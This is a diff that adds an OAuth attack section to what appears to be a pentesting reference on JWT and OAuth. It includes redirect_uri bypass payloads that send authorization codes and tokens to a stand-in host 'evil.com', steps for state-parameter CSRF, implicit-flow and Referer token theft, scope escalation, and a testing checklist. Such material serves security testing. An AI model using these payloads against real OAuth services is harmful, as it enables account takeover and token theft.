@@ -430,3 +430,94 @@ See `references/tools.md` for detailed usage of:
 - **Burp JWT Editor** — in-proxy attack suite
 
 See `references/jwt-secrets.txt` for the brute-force wordlist.
+
+---
+
+## From hack-skills: OAuth Attack Chains
+
+### OAuth State Parameter CSRF
+
+The `state` parameter prevents CSRF on OAuth flows. If absent or predictable:
+
+```text
+Attack flow:
+1. Attacker initiates OAuth flow, captures the authorization URL
+2. Does NOT complete the flow — saves the URL with the pending code
+3. Tricks victim into visiting: /oauth/callback?code=ATTACKER_CODE&state=ATTACKER_STATE
+4. Victim's session gets linked to attacker's account
+
+Test: check if state is absent, static, or correlates to session
+```
+
+### redirect_uri Bypass for OAuth Flows
+
+When `redirect_uri` validation is insufficient:
+
+```text
+Exact match bypass:
+redirect_uri=https://target.com/callback/../evil?
+redirect_uri=https://target.com/callback%2F..%2Fevil
+redirect_uri=https://target.com/callback@evil.com
+redirect_uri=https://target.com/callback#@evil.com
+
+Subdomain bypass (if wildcard allowed):
+redirect_uri=https://evil.target.com/callback
+
+Path traversal (if prefix match only):
+redirect_uri=https://target.com/callback/../../open-redirect?url=evil.com
+```
+
+**Token theft via open redirect on authorized domain:**
+```text
+/authorize?redirect_uri=https://target.com/redirect?url=https://evil.com
+→ auth code/token appended to evil.com URL
+```
+
+### Implicit Flow Token Theft
+
+```text
+If response_type=token (OAuth implicit flow):
+→ Access token appears in URL fragment: #access_token=TOKEN
+
+Attack:
+1. Trick user into visiting malicious OAuth authorization URL
+2. redirect_uri points to attacker page or open redirect
+3. Fragment with access_token appears in browser history / Referer
+```
+
+### Scope Escalation
+
+```text
+# Add undocumented or privileged scopes:
+scope=read write admin
+scope=openid profile email https://graph.microsoft.com/.default
+scope=offline_access admin.write
+
+# Check if server silently grants extra scopes vs. explicitly errors
+# Inspect granted scopes in token claims (scope / scp field)
+```
+
+### Token Leakage via Referer Header
+
+```text
+# When access_token appears in URL as query param (not fragment):
+?access_token=TOKEN
+
+→ Browser sends Referer: https://target.com/page?access_token=TOKEN
+  to any subsequent cross-origin resource loads
+→ Token leaked to external analytics, CDN, or third-party JS libraries
+
+# Also check: logs, proxies, error pages that reflect the full URL
+```
+
+### OAuth Quick Checklist
+
+```
+□ State parameter: missing, static, or predictable?
+□ redirect_uri: accepts subdomains, paths, path traversal?
+□ Open redirect on the authorized domain? (chain for token theft)
+□ Implicit flow: token in URL fragment → check for Referer leakage
+□ Scope: can you request privileged scopes (admin, write, offline_access)?
+□ Token bound to client? Can you use a code from one client on another?
+□ PKCE missing on public clients? (code interception attack)
+```
